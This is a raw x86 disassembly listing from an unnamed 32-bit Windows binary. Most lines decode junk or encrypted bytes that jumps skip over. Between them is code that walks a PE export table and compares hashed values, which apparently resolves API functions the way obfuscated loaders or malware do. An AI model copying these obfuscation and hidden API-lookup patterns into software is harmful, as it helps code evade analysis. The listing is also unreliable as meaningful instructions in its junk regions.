  40193b:	jl     0x4018da
  40193d:	xor    al,BYTE PTR [edx]
  40193f:	data16 mov al,ds:0xaaead8ad
  401945:	sbb    edx,DWORD PTR [eax]
  401947:	dec    eax
  401948:	jne    0x40195f
  40194a:	sbb    BYTE PTR [esi-0x1c1556e3],ah
  401950:	adc    bl,cl
  401952:	mov    edi,0xbd77a326
  401957:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401958:	imul   ebx,esi,0x15
  40195b:	push   es
  40195c:	and    al,0x11
  40195e:	mov    ebx,0xb552bc0b
  401963:	add    al,0xc
  401965:	fdiv   DWORD PTR [edi+0x18]
  401968:	mul    DWORD PTR [ecx]
  40196a:	jge    0x40195b
  40196c:	outs   dx,DWORD PTR gs:[esi]
  40196e:	leave  
  40196f:	jno    0x40193e
  401971:	ss ss push ds
  401974:	icebp  
  401975:	retf   
  401976:	rcl    bh,0xfb
  401979:	pop    ebp
  40197a:	sub    al,0x21
  40197c:	push   0x2ff0aab8
  401981:	xchg   edx,eax
  401982:	add    ebp,0xffffff90
  401985:	std    
  401986:	out    0x91,eax
  401988:	push   ecx
  401989:	pushf  
  40198a:	ja     0x40193f
  40198c:	test   ch,cl
  40198e:	loope  0x401987
  401990:	push   edi
  401991:	push   ds
  401992:	cmp    DWORD PTR [esi+0x42d4fc41],esp
  401998:	and    cl,BYTE PTR [ecx+eax*8]
  40199b:	jmp    0x401932
  40199d:	dec    edi
  40199e:	(bad)  
  40199f:	dec    eax
  4019a0:	dec    esi
  4019a1:	and    esp,DWORD PTR [eax]
  4019a3:	jmp    0x4019ab
  4019a5:	sub    eax,0x74a4b505
  4019aa:	in     eax,dx
  4019ab:	call   DWORD PTR [edi+0x1a2e8edd]
  4019b1:	xor    edi,0x27
  4019b4:	adc    eax,DWORD PTR [esi-0x13de288b]
  4019ba:	icebp  
  4019bb:	in     al,0xb1
  4019bd:	imul   edx,DWORD PTR [edx+0x659097ad],0xffffffa1
  4019c4:	and    cl,BYTE PTR [edx+0x6c4e4f1]
  4019ca:	mov    edi,0x545e4cb3
  4019cf:	sar    edi,0x75
  4019d2:	or     al,ch
  4019d4:	mov    edi,0xe9000066
  4019d9:	into   
  4019da:	add    BYTE PTR [eax],al
  4019dc:	add    ah,bh
  4019de:	mov    ecx,eax
  4019e0:	mov    ecx,ebx
  4019e2:	dec    ebx
  4019e3:	mov    edi,0x495a648b
  4019e8:	aad    0xf5
  4019ea:	adc    eax,0x73ac97da
  4019ef:	jl     0x401a6d
  4019f1:	mov    ds:0x3a7c7c7c,al
  4019f6:	mov    eax,ds:0x600c1dd4
  4019fb:	pop    esi
  4019fc:	jge    0x401981
  4019fe:	cwde   
  4019ff:	js     0x4019a3
  401a01:	xor    bh,ah
  401a03:	jle    0x401a16
  401a05:	push   ebp
  401a06:	lahf   
  401a07:	sub    al,0x95
  401a09:	sub    bh,al
  401a0b:	scas   eax,DWORD PTR es:[edi]
  401a0c:	lods   eax,DWORD PTR ds:[esi]
  401a0d:	js     0x401a09
  401a0f:	sbb    eax,DWORD PTR [ecx-0x6231afdd]
  401a15:	bound  ebx,QWORD PTR [edi+0x6e]
  401a18:	loopne 0x401a8e
  401a1a:	retf   0x34ae
  401a1d:	int    0x3c
  401a1f:	gs add eax,0xfcb3b9e8
  401a25:	sahf   
  401a26:	inc    ebp
  401a27:	aad    0x1f
  401a29:	daa    
  401a2a:	js     0x4019bc
  401a2c:	out    0x54,al
  401a2e:	jg     0x401a98
  401a30:	inc    eax
  401a31:	jo     0x4019cf
  401a33:	push   ecx
  401a34:	jl     0x401a11
  401a36:	rol    DWORD PTR [edi+0x76],cl
  401a39:	data16 jbe 0x401ab9
  401a3c:	mov    ebp,DWORD PTR [ecx+0x4e2d6db9]
  401a42:	dec    edi
  401a43:	pop    esi
  401a44:	mov    ds:0xc3246ea7,eax
  401a49:	push   ebx
  401a4a:	mov    ecx,0x3b1f8715
  401a4f:	aad    0xb3
  401a51:	jnp    0x4019db
  401a53:	call   0x44f0d29d
  401a58:	jo     0x401ab3
  401a5a:	mov    edx,0xb6a400
  401a5f:	xor    ebp,ebp
  401a61:	pop    ebx
  401a62:	jmp    0x401a70
  401a64:	adc    DWORD PTR [eax],edi
  401a66:	jae    0x401ac4
  401a68:	loope  0x401a7e
  401a6a:	(bad)  
  401a6b:	cs out 0x30,eax
  401a6e:	jnp    0x401a19
  401a70:	clc    
  401a71:	aad    0x71
  401a73:	(bad)
  401a76:	jnp    0x401a47
  401a78:	mov    eax,0xfde26d8b
  401a7d:	dec    edi
  401a7e:	hlt    
  401a7f:	push   ss
  401a80:	out    dx,al
  401a81:	daa    
  401a82:	pop    edx
  401a83:	repz scas al,BYTE PTR es:[edi]
  401a85:	cmp    BYTE PTR [esi+eax*1-0x30352964],bl
  401a8c:	xchg   BYTE PTR [esi+0x5d],ah
  401a8f:	or     ebp,esi
  401a91:	jne    0x401aa5
  401a93:	out    dx,eax
  401a94:	add    bl,BYTE PTR [ebx-0x59]
  401a97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a98:	xor    al,0x9e
  401a9a:	cmp    BYTE PTR [eax],0x18
  401a9d:	hlt    
  401a9e:	add    eax,0x4ba58efc
  401aa3:	lds    edx,FWORD PTR [edx-0x1b]
  401aa6:	and    DWORD PTR [esi+0x6],edi
  401aa9:	dec    edx
  401aaa:	sub    DWORD PTR [ecx+0x458bec45],ecx
  401ab0:	cld    
  401ab1:	add    DWORD PTR ds:0x44a6cc,ecx
  401ab7:	mov    ecx,DWORD PTR [ebp-0x14]
  401aba:	xor    eax,esi
  401abc:	add    eax,ebx
  401abe:	mov    DWORD PTR ds:0x424736,0x6998
  401ac8:	cmp    ecx,eax
  401aca:	mov    DWORD PTR ds:0x44a6d4,0x4e4a
  401ad4:	je     0x4021a9
  401ada:	mov    eax,DWORD PTR [ebp-0x14]
  401add:	mov    eax,DWORD PTR [eax+0x18]
  401ae0:	and    DWORD PTR ds:0x447994,0x0
  401aea:	xor    ecx,ecx
  401aec:	add    ecx,DWORD PTR ds:0x447994
  401af2:	inc    ecx
  401af3:	mov    DWORD PTR ds:0x447994,ecx
  401af9:	cmp    DWORD PTR ds:0x447994,0x7
  401b00:	jne    0x401b19
  401b06:	push   0x41098d
  401b0b:	push   0x41075f
  401b10:	push   DWORD PTR [ebp-0x1c]
  401b13:	call   DWORD PTR ds:0x442344
  401b19:	cmp    DWORD PTR ds:0x447994,0x6
  401b20:	jne    0x401b35
  401b26:	xor    ecx,ecx
  401b28:	xor    ecx,DWORD PTR ds:0x447994
  401b2e:	inc    ecx
  401b2f:	mov    DWORD PTR ds:0x447994,ecx
  401b35:	cmp    DWORD PTR ds:0x447994,0x12
  401b3c:	jb     0x401aea
  401b42:	sub    DWORD PTR ds:0x42473a,0x3b9b
  401b4c:	jmp    0x401c1f
  401b51:	inc    ecx
  401b52:	adc    eax,0x9d621a92
  401b57:	jns    0x401bc6
  401b59:	retf   
  401b5a:	push   cs
  401b5b:	ins    BYTE PTR es:[edi],dx
  401b5c:	jno    0x401af0
  401b5e:	ja     0x401b2b
  401b60:	pop    ds
  401b61:	shl    BYTE PTR [edx+0x7c],cl
  401b64:	jl     0x401b08
  401b66:	jl     0x401be4
  401b68:	jl     0x401bd2
  401b6a:	pop    ebp
  401b6b:	mov    dh,0x21
  401b6d:	(bad)  [ebp+0x42810a63]
  401b73:	jnp    0x401b4c
  401b75:	mov    bh,0x59
  401b77:	aam    0x80
  401b79:	cmp    cl,BYTE PTR [ebx-0x1137aeeb]
  401b7f:	or     BYTE PTR [esi-0x66],al
  401b82:	dec    esp
  401b83:	(bad)  
  401b84:	jmp    0xee82:0xd03dc1da
  401b8b:	jecxz  0x401b85
  401b8d:	mov    cl,0xe0
  401b8f:	loopne 0x401b90
  401b91:	sub    cl,BYTE PTR [eax+edx*2]
  401b94:	xchg   edx,eax
  401b95:	push   0xe9b0c75c
  401b9a:	mov    ecx,0x8e16f041
  401b9f:	retf   0xc7e3
  401ba2:	mov    ds,esi
  401ba4:	xchg   edi,eax
  401ba5:	ret    
  401ba6:	adc    eax,0x6750e3d8
  401bab:	mov    ds,WORD PTR [eax]
  401bad:	test   DWORD PTR [ecx-0x65706b83],0xb273ec5a
  401bb7:	pop    eax
  401bb8:	(bad)  
  401bb9:	pop    ebp
  401bba:	sub    BYTE PTR [edx+0x69],dh
  401bbd:	adc    ebp,DWORD PTR [edi]
  401bbf:	add    esi,esp
  401bc1:	cmp    BYTE PTR [edx+0x660e6ebb],0xc
  401bc8:	sub    eax,0x7a0a901a
  401bcd:	xlat   BYTE PTR ds:[ebx]
  401bce:	mov    edi,0x18683592
  401bd3:	shl    BYTE PTR [ebx-0x3588e0f7],cl
  401bd9:	dec    esp
  401bda:	push   ds
  401bdb:	ds jge 0x401c2f
  401bde:	leave  
  401bdf:	fidivr WORD PTR [ecx-0xd2e5c9a]
  401be5:	setl   BYTE PTR [ebx-0x5e]
  401be9:	not    eax
  401beb:	stos   DWORD PTR es:[edi],eax
  401bec:	push   ebx
  401bed:	retf   0xe104
  401bf0:	add    ecx,edi
  401bf2:	test   eax,0x39e84abc
  401bf7:	enter  0xf714,0xd1
  401bfb:	inc    edi
  401bfc:	retf   
  401bfd:	sub    DWORD PTR [edi-0x4a],eax
  401c00:	mov    WORD PTR [edx+0x20],gs
  401c03:	lock sbb al,0x72
  401c06:	stc    
  401c07:	xor    eax,eax
  401c09:	pop    eax
  401c0a:	aam    0x58
  401c0c:	nop
  401c0d:	lods   al,BYTE PTR ds:[esi]
  401c0e:	std    
  401c0f:	push   ss
  401c10:	jo     0x401b9e
  401c12:	(bad)  
  401c14:	std    
  401c15:	ins    BYTE PTR es:[edi],dx
  401c16:	cld    
  401c17:	test   BYTE PTR [ebx-0x70],0x97
  401c1b:	cmp    BYTE PTR [esi+0x51],al
  401c1e:	xchg   BYTE PTR [ecx-0x1e7e1fbb],cl
  401c24:	mov    bl,0x68
  401c26:	add    BYTE PTR [eax],al
  401c28:	mov    eax,DWORD PTR [ebp-0x14]
  401c2b:	mov    ecx,DWORD PTR [ebp+0x8]
  401c2e:	and    DWORD PTR ds:0x44799c,0x44a6e0
  401c38:	add    ecx,DWORD PTR [eax+0x20]
  401c3b:	movzx  eax,BYTE PTR ds:0x44d424
  401c42:	and    eax,DWORD PTR ds:0x44a6e4
  401c48:	mov    ds:0x44d424,eax
  401c4d:	mov    DWORD PTR [ebp-0x28],ecx
  401c50:	sub    DWORD PTR ds:0x424742,ecx
  401c56:	mov    eax,DWORD PTR [ebp-0x14]
  401c59:	and    DWORD PTR ds:0x41074b,0x0
  401c63:	jmp    0x401c75
  401c68:	mov    ecx,DWORD PTR ds:0x41074b
  401c6e:	inc    ecx
  401c6f:	mov    DWORD PTR ds:0x41074b,ecx
  401c75:	cmp    DWORD PTR ds:0x41074b,0x1d
  401c7c:	jae    0x401cc9
  401c82:	cmp    DWORD PTR ds:0x41074b,0x9
  401c89:	jne    0x401caa
  401c8f:	push   DWORD PTR [ebp-0x20]
  401c92:	push   0x8068
  401c97:	push   0x67b9
  401c9c:	push   0x4109ab
  401ca1:	push   DWORD PTR [ebp-0x24]
  401ca4:	call   DWORD PTR ds:0x4420c8
  401caa:	cmp    DWORD PTR ds:0x41074b,0x8
  401cb1:	jne    0x401cc4
  401cb7:	mov    ecx,DWORD PTR ds:0x41074b
  401cbd:	inc    ecx
  401cbe:	mov    DWORD PTR ds:0x41074b,ecx
  401cc4:	jmp    0x401c68
  401cc9:	mov    ecx,DWORD PTR [ebp+0x8]
  401ccc:	not    DWORD PTR ds:0x44798c
  401cd2:	add    ecx,DWORD PTR [eax+0x24]
  401cd5:	xor    DWORD PTR ds:0x44a6e0,0x6435
  401cdf:	mov    DWORD PTR [ebp-0x2c],ecx
  401ce2:	jmp    0x401db5
  401ce7:	cmp    edi,DWORD PTR [ebx]
  401ce9:	mov    eax,0xbd95b815
  401cee:	cmp    eax,0x3403dcf7
  401cf3:	mov    esi,eax
  401cf5:	fdiv   st(5),st
  401cf7:	sbb    BYTE PTR [ebp+0x7c],dh
  401cfa:	jl     0x401c9e
  401cfc:	jl     0x401d7a
  401cfe:	jl     0x401cb1
  401d00:	bound  ebx,QWORD PTR [ecx+0x2d176cd3]
  401d06:	sub    ebp,DWORD PTR [ebx+edi*8]
  401d09:	inc    edi
  401d0a:	ficomp DWORD PTR [edx+0x3f]
  401d0d:	pop    ss
  401d0e:	add    BYTE PTR [esi-0x3dce5f43],bh
  401d14:	out    dx,eax
  401d15:	jo     0x401d35
  401d17:	inc    esp
  401d18:	adc    bl,BYTE PTR [ebx+0x3d]
  401d1b:	adc    DWORD PTR [ebp+0x79],esp
  401d1e:	sub    BYTE PTR [esi-0x72],bh
  401d21:	sub    BYTE PTR [ebp+0x3e],ah
  401d24:	jl     0x401d68
  401d26:	push   ebx
  401d27:	or     al,0xa7
  401d29:	mov    bh,0xf4
  401d2b:	and    DWORD PTR [ecx+ebp*8+0x2b],ebx
  401d2f:	mov    ecx,DWORD PTR [ebx-0x7f]
  401d32:	jmp    0xf281:0xa34ddc27
  401d39:	inc    esp
  401d3a:	sahf   
  401d3b:	sahf   
  401d3c:	mov    ch,BYTE PTR [edx-0x31]
  401d3f:	sbb    BYTE PTR [ebx-0x69],0xef
  401d43:	xchg   esi,eax
  401d44:	test   eax,0x270304d8
  401d49:	and    al,0x72
  401d4b:	add    bl,0xdf
  401d4e:	adc    eax,0xbb1e4124
  401d53:	out    dx,al
  401d54:	ffreep st(7)
  401d56:	mov    ch,0x98
  401d58:	mov    bl,BYTE PTR [ebx-0x315788c8]
  401d5e:	push   edi
  401d5f:	adc    BYTE PTR [ecx+0x5f],dl
  401d62:	sub    ecx,esp
  401d64:	cmp    BYTE PTR [ecx+eiz*8],dh
  401d67:	sbb    BYTE PTR [edi-0x26813c40],dh
  401d6d:	xchg   ecx,eax
  401d6e:	jp     0x401d92
  401d70:	xor    BYTE PTR [ecx+0x950057],al
  401d76:	xchg   esp,eax
  401d77:	xor    ebx,DWORD PTR [esp+edx*1]
  401d7a:	cmp    BYTE PTR [edx-0x563eeef7],cl
  401d80:	(bad)  [esi+0x51]
  401d83:	inc    eax
  401d84:	inc    ebx
  401d85:	push   0xffffffba
  401d87:	(bad)  
  401d88:	ins    BYTE PTR es:[edi],dx
  401d89:	dec    esi
  401d8a:	sub    BYTE PTR [ebp-0xfcfee6c],bh
  401d90:	sub    BYTE PTR [esi+0x53],bh
  401d93:	stc    
  401d94:	jbe    0x401d4d
  401d96:	or     bl,bh
  401d98:	push   ds
  401d99:	mov    edx,0xa3e849cf
  401d9e:	cmp    dh,BYTE PTR [ecx-0x119bb318]
  401da4:	stc    
  401da5:	imul   edx,DWORD PTR [ecx-0x52c074a1],0x3d
  401dac:	imul   esi,DWORD PTR [edi-0x33],0xffffffdd
  401db0:	aam    0x4e
  401db2:	jnp    0x401d4f
  401db4:	xchg   edx,eax
  401db5:	mov    eax,DWORD PTR [ebp-0x14]
  401db8:	mov    DWORD PTR ds:0x41075b,0x19
  401dc2:	cmp    DWORD PTR ds:0x41075b,0x0
  401dc9:	je     0x401e11
  401dcf:	cmp    DWORD PTR ds:0x41075b,0xb
  401dd6:	jne    0x401de5
  401ddc:	push   DWORD PTR [ebp-0x24]
  401ddf:	call   DWORD PTR ds:0x4420cc
  401de5:	cmp    DWORD PTR ds:0x41075b,0xc
  401dec:	jne    0x401dff
  401df2:	mov    ecx,DWORD PTR ds:0x41075b
  401df8:	dec    ecx
  401df9:	mov    DWORD PTR ds:0x41075b,ecx
  401dff:	mov    ecx,DWORD PTR ds:0x41075b
  401e05:	dec    ecx
  401e06:	mov    DWORD PTR ds:0x41075b,ecx
  401e0c:	jmp    0x401dc2
  401e11:	mov    ecx,DWORD PTR [ebp+0x8]
  401e14:	add    ecx,DWORD PTR [eax+0x1c]
  401e17:	xor    esi,esi
  401e19:	mov    DWORD PTR [ebp-0x14],ecx
  401e1c:	jmp    0x401eef
  401e21:	xor    al,0x72
  401e23:	mov    ds:0x46657dd5,eax
  401e28:	sub    eax,0xe5b1e0bc
  401e2d:	scas   eax,DWORD PTR es:[edi]
  401e2e:	jb     0x401e60
  401e30:	dec    esi
  401e31:	dec    esi
  401e32:	jne    0x401eb0
  401e34:	jl     0x401dd8
  401e36:	jl     0x401eb4
  401e38:	jl     0x401dd2
  401e3a:	xchg   edx,eax
  401e3b:	jnp    0x401e34
  401e3d:	aas    
  401e3e:	cmp    BYTE PTR [edx+0x6],cl
  401e41:	int    0x4b
  401e43:	cwde   
  401e44:	cmc    
  401e45:	jmp    0x8373:0x417091df
  401e4c:	cld    
  401e4d:	push   cs
  401e4e:	ret    0x23aa
  401e51:	js     0x401e32
  401e53:	ss jg  0x401ddb
  401e56:	and    BYTE PTR [eax+0x7],bh
  401e59:	push   cs
  401e5a:	inc    esi
  401e5b:	gs pop edi
  401e5d:	cmp    eax,0x6d713cb7
  401e62:	xor    DWORD PTR [esi-0x52e1f0ed],esp
  401e68:	nop
  401e69:	mov    cl,0xae
  401e6b:	xchg   BYTE PTR [esi-0x7120116b],ch
  401e71:	add    BYTE PTR [edx+0x1f43ad3c],bh
  401e77:	and    BYTE PTR [edx+ebx*1],ah
  401e7a:	lahf   
  401e7b:	popf   
  401e7c:	pop    edx
  401e7d:	mov    ss,WORD PTR [eax]
  401e7f:	mov    ds:0x95371c10,al
  401e84:	push   ecx
  401e85:	pop    esi
  401e86:	sbb    DWORD PTR [ebx-0x3aef8c4a],edx
  401e8c:	sub    dl,BYTE PTR [edx]
  401e8e:	add    dl,BYTE PTR [edx]
  401e90:	push   ss
  401e91:	cmp    al,bh
  401e93:	aas    
  401e94:	pop    edi
  401e95:	add    eax,0x612e41ff
  401e9a:	popa   
  401e9b:	aaa    
  401e9c:	mov    dl,0x4f
  401e9e:	sbb    ch,dh
  401ea0:	retf   0x51c8
  401ea3:	(bad)  
  401ea4:	dec    ebx
  401ea5:	cmp    ch,BYTE PTR [ecx]
  401ea7:	push   esi
  401ea8:	add    eax,0xf76b4cea
  401ead:	or     eax,0xb9f35b9e
  401eb2:	outs   dx,DWORD PTR ds:[esi]
  401eb3:	jnp    0x401ed1
  401eb5:	adc    eax,0xdf9c0063
  401eba:	adc    cl,BYTE PTR ds:0x9e318784
  401ec0:	jnp    0x401e51
  401ec2:	xchg   edx,eax
  401ec3:	mov    edx,0xfbc5aea3
  401ec8:	lods   al,BYTE PTR ds:[esi]
  401ec9:	in     eax,0x93
  401ecb:	jg     0x401e79
  401ecd:	mov    dl,0x22
  401ecf:	in     al,dx
  401ed0:	or     al,0xd1
  401ed2:	ja     0x401f14
  401ed4:	cmp    DWORD PTR [esi-0x12],0x222ec8e0
  401edb:	mov    eax,ebx
  401edd:	mov    ebx,0x96079322
  401ee2:	adc    BYTE PTR [edi],ch
  401ee4:	stos   DWORD PTR es:[edi],eax
  401ee5:	xchg   esp,eax
  401ee6:	pop    ecx
  401ee7:	mov    ebp,DWORD PTR [edx]
  401ee9:	adc    dh,ch
  401eeb:	ud0    edi,ebx
  401eee:	mov    ecx,0x8bd8458b
  401ef3:	dec    ebp
  401ef4:	or     BYTE PTR [ebx],al
  401ef6:	or     al,0xb8
  401ef8:	lea    eax,[ebp-0x8]
  401efb:	mov    DWORD PTR [ebp-0x30],ecx
  401efe:	push   eax
  401eff:	push   DWORD PTR [ebp-0x30]
  401f02:	jmp    0x401fd5
  401f07:	pop    esp
  401f08:	jecxz  0x401f20
  401f0a:	xchg   ebp,eax
  401f0b:	mov    ebp,0x1ee56b7d
  401f10:	jb     0x401ec2
  401f12:	daa    
  401f13:	(bad)  
  401f14:	pop    ebp
  401f15:	test   BYTE PTR [esi+0x7c7c74f4],dh
  401f1b:	mov    ds:0xc7c7c7c,al
  401f20:	mov    al,ds:0xdceb17b
  401f25:	mov    ch,0x79
  401f27:	or     bh,BYTE PTR [ebx]
  401f29:	sbb    BYTE PTR [ebx-0x46c74c4a],0x97
  401f30:	fisttp QWORD PTR [ebp-0x4e]
  401f33:	int3   
  401f34:	dec    ebp
  401f35:	sar    BYTE PTR [ebp-0x6e],cl
  401f38:	pop    edi
  401f39:	stos   DWORD PTR es:[edi],eax
  401f3a:	inc    ecx
  401f3b:	jmp    0x401f82
  401f3d:	les    ebx,FWORD PTR [ebx+eax*1-0x5fbbf2b2]
  401f44:	xchg   DWORD PTR [ebp+0x3a],ebx
  401f47:	clc    
  401f48:	fist   WORD PTR [ebp+edx*1+0x5b]
  401f4c:	inc    esp
  401f4d:	sub    edi,ecx
  401f4f:	push   edi
  401f50:	fs mov ebp,0xed1968e2
  401f56:	hlt    
  401f57:	pop    esi
  401f58:	(bad)  
  401f59:	hlt    
  401f5a:	pop    ds
  401f5b:	ret    0x8cd0
  401f5e:	or     esi,DWORD PTR [ebx]
  401f60:	xor    ecx,DWORD PTR [edx+0x5f]
  401f63:	sub    BYTE PTR [esi-0x2feb9594],bl
  401f69:	pop    ebp
  401f6a:	pop    esp
  401f6b:	jbe    0x401f41
  401f6d:	lock aam 0x1a
  401f70:	adc    edx,edx
  401f72:	rcl    DWORD PTR [ebp-0xf2c48e8],1
  401f78:	push   edx
  401f79:	xchg   bl,cl
  401f7b:	lds    ebx,FWORD PTR [esp+eiz*4-0x6aeba14e]
  401f82:	push   0xffffffe7
  401f84:	jns    0x401f44
  401f86:	inc    ebp
  401f87:	dec    ecx
  401f88:	call   0xf501cda4
  401f8d:	popa   
  401f8e:	jo     0x401f88
  401f90:	jge    0x401f5c
  401f92:	fcmovb st,st(6)
  401f94:	adc    bh,BYTE PTR [edx]
  401f96:	mov    bl,BYTE PTR [esp+eax*8]
  401f99:	add    bh,BYTE PTR [edx+0x1ae2776c]
  401f9f:	jecxz  0x402015
  401fa1:	mov    ds,esp
  401fa3:	(bad)  [esi-0x12afb841]
  401fa9:	mov    bl,0xb3
  401fab:	pop    ebp
  401fac:	mov    esp,0xff73aabc
  401fb1:	adc    esi,edi
  401fb3:	or     eax,0xcb34f4c4
  401fb8:	xlat   BYTE PTR ds:[ebx]
  401fb9:	sub    al,0x6c
  401fbb:	xor    DWORD PTR [ebx+eiz*2-0x1],0x27
  401fc0:	mov    edx,0xd79b4b6d
  401fc5:	lds    ebp,FWORD PTR [esi-0x636d5060]
  401fcb:	in     eax,0x4a
  401fcd:	scas   eax,DWORD PTR es:[edi]
  401fce:	and    eax,0x2ccb9597
  401fd3:	add    eax,0xc75ff07
  401fd8:	jmp    0x4020ab
  401fdd:	or     dl,BYTE PTR [eax+ebp*1]
  401fe0:	mov    dl,0x2a
  401fe2:	mov    dl,0x6a
  401fe4:	push   esp
  401fe5:	int3   
  401fe6:	xchg   ebp,eax
  401fe7:	xchg   esp,eax
  401fe8:	int    0xc4
  401fea:	loope  0x402008
  401fec:	mov    ?,WORD PTR [edx]
  401fee:	ja     0x40206c
  401ff0:	jl     0x401f94
  401ff2:	jl     0x402070
  401ff4:	jl     0x401f7a
  401ff6:	push   esi
  401ff7:	xchg   esi,eax
  401ff8:	add    eax,0x686daaa4
  401ffd:	dec    ebp
  401ffe:	fmul   QWORD PTR [edx+0x70e5fdb8]
  402004:	lahf   
  402005:	add    eax,0x5c9691d2
  40200a:	jns    0x401fa4
  40200c:	xchg   esi,eax
  40200d:	imul   edi,ebp,0xffffff97
  402010:	xlat   BYTE PTR ds:[ebx]
  402011:	dec    esp
  402012:	daa    
  402013:	add    al,0x59
  402015:	(bad)  
  402016:	fnstcw WORD PTR [ecx-0x7b12cd87]
  40201c:	pop    esi
  40201d:	and    edx,esp
  40201f:	shl    BYTE PTR [edi-0x65070698],cl
  402025:	sbb    eax,0xe7f45748
  40202a:	push   edi
  40202b:	inc    ecx
  40202c:	fsub   QWORD PTR [ecx+0x57]
  40202f:	push   eax
  402030:	adc    al,0x32
  402032:	add    esi,DWORD PTR ss:0xc4bc47b5
  402039:	and    esi,DWORD PTR [ecx+0x16fddde2]
  40203f:	in     al,dx
  402040:	mov    DWORD PTR [ebx],edi
  402042:	xor    BYTE PTR [ecx-0x289fcff2],ch
  402048:	(bad)  
  402049:	or     al,0xac
  40204b:	aaa    
  40204c:	xchg   edx,eax
  40204d:	pop    esp
  40204e:	mov    dl,0x2d
  402050:	fs retf 
  402052:	pop    es
  402053:	sbb    DWORD PTR [edx],ecx
  402055:	jnp    0x402029
  402057:	aas    
  402058:	sbb    BYTE PTR [ebx],0x5
  40205b:	call   0xf2f8:0x29ac694e
  402062:	pop    ebx
  402063:	mov    esp,0x710dc351
  402068:	mov    BYTE PTR [edi+0x1b],bl
  40206b:	and    eax,0x59bc6832
  402070:	mov    edi,0x221f0779
  402075:	xrelease mov BYTE PTR [esi-0x73],cl
  402079:	mov    dl,0x4b
  40207b:	jmp    FWORD PTR [ebp-0x25af5f51]
  402081:	sbb    al,0xd6
  402083:	call   0xae81:0xa75f0809
  40208a:	jl     0x402037
  40208c:	mov    eax,0x688eb274
  402091:	repz in al,0xac
  402094:	jns    0x4020d9
  402096:	inc    esi
  402097:	xchg   ebx,eax
  402098:	xor    ebx,esi
  40209a:	adc    eax,0x6f02714
  40209f:	iret   
  4020a0:	inc    eax
  4020a1:	inc    esi
  4020a2:	add    BYTE PTR [edi],bl
  4020a4:	aas    
  4020a5:	clc    
  4020a6:	outs   dx,BYTE PTR ds:[esi]
  4020a7:	int    0x87
  4020a9:	fmulp  st(7),st
  4020ab:	call   0x409298
  4020b0:	mov    eax,DWORD PTR [ebp-0x4]
  4020b3:	mov    ecx,DWORD PTR [ebp-0x8]
  4020b6:	xor    eax,0x7510857
  4020bb:	add    eax,ebx
  4020bd:	cmp    ecx,eax
  4020bf:	jne    0x4021b5
  4020c5:	jmp    0x402198
  4020ca:	dec    esp
  4020cb:	xchg   esp,eax
  4020cc:	pop    edi
  4020cd:	add    BYTE PTR [edi-0x25],ah
  4020d0:	arpl   WORD PTR [eax-0x10],bp
  4020d3:	adc    ebx,DWORD PTR [eax-0x7ddbe5b8]
  4020d9:	xchg   edi,eax
  4020da:	pusha  
  4020db:	ja     0x402159
  4020dd:	jl     0x402081
  4020df:	jl     0x40215d
  4020e1:	jl     0x402105
  4020e3:	lahf   
  4020e4:	mov    edi,0xedce52b3
  4020e9:	add    al,0xb4
  4020eb:	mov    WORD PTR [esi+ebx*4+0x34],cs
  4020ef:	jno    0x4020b2
  4020f1:	mov    al,ds:0xda6f6f65
  4020f6:	in     eax,0x9
  4020f8:	jmp    0x9b57:0xba25119a
  4020ff:	push   edx
  402100:	xchg   esi,eax
  402101:	mov    eax,0xf2485042
  402106:	dec    esi
  402107:	mov    cl,0x5b
  402109:	xor    al,0x45
  40210b:	dec    edi
  40210c:	ja     0x40213e
  40210e:	fwait
  40210f:	sbb    BYTE PTR [edx],bl
  402111:	outs   dx,DWORD PTR ds:[esi]
  402112:	push   edx
  402113:	imul   DWORD PTR [ecx]
  402115:	int    0xce
  402117:	xchg   ecx,eax
  402118:	and    BYTE PTR ds:[edx],ch
  40211b:	pop    edx
  40211c:	inc    ebp
  40211d:	inc    edx
  40211e:	int3   
  40211f:	js     0x4020db
  402121:	mov    ds:0x138d5fb8,al
  402126:	pop    ds
  402127:	push   cs
  402128:	jb     0x402116
  40212a:	sbb    cl,cl
  40212c:	enter  0x4479,0x54
  402130:	mov    ecx,DWORD PTR [edi-0x50]
  402133:	jmp    FWORD PTR [edi-0x3a00e85a]
  402139:	sub    ebp,ebx
  40213b:	pop    eax
  40213c:	mov    WORD PTR [eax+0x5a],es
  40213f:	xchg   esi,eax
  402140:	or     dl,ah
  402142:	or     al,0xaf
  402144:	jmp    0xb761:0x9c10f60d
  40214b:	lea    ebx,[edi-0x7e]
  40214e:	mov    ebp,0x32683c15
  402153:	(bad)  
  402154:	imul   ebp,DWORD PTR [ebp+0x6b6e8fef],0xffffffc9
  40215b:	test   al,0xc0
  40215d:	dec    edx
  40215e:	in     al,0x5b
  402160:	dec    ebx
  402161:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402162:	push   eax
  402163:	add    bh,bh
  402165:	mov    cl,0x7
  402167:	cld    
  402168:	shl    ebx,1
  40216a:	ss jmp 0xba9eec90
  402170:	aaa    
  402171:	xor    edx,esp
  402173:	out    0x28,eax
  402175:	out    dx,eax
  402176:	les    eax,FWORD PTR [ebp+esi*4-0x48]
  40217a:	rol    BYTE PTR [eax+0x73],1
  40217d:	test   eax,0x680d3609
  402182:	mov    esi,0xcf382d96
  402187:	shl    bl,cl
  402189:	in     eax,dx
  40218a:	mov    esi,esp
  40218c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40218d:	std    
  40218e:	pop    ecx
  40218f:	ficomp WORD PTR [ebx+ebx*2+0x67]
  402193:	clc    
  402194:	(bad)  [edi]
  402196:	mov    ah,al
  402198:	mov    eax,DWORD PTR [ebp-0x20]
  40219b:	inc    edi
  40219c:	cmp    edi,eax
  40219e:	jb     0x401676
  4021a4:	jmp    0x402298
  4021a9:	mov    eax,DWORD PTR [ebp-0x4]
  4021ac:	xor    eax,esi
  4021ae:	add    eax,ebx
  4021b0:	jmp    0x402c24
  4021b5:	mov    eax,DWORD PTR [ebp-0x2c]
  4021b8:	movzx  eax,WORD PTR [eax+edi*2]
  4021bc:	mov    ecx,DWORD PTR [ebp-0x14]
  4021bf:	mov    eax,DWORD PTR [ecx+eax*4]
  4021c2:	jmp    0x402295
  4021c7:	lods   eax,DWORD PTR ds:[esi]
  4021c8:	adc    ah,BYTE PTR [edi+0x7d7da75f]
  4021ce:	jmp    0x3d5:0xa7f835f7
  4021d5:	ins    BYTE PTR es:[edi],dx
  4021d6:	popa   
  4021d7:	xchg   esi,eax
  4021d8:	jbe    0x402256
  4021da:	jl     0x40217e
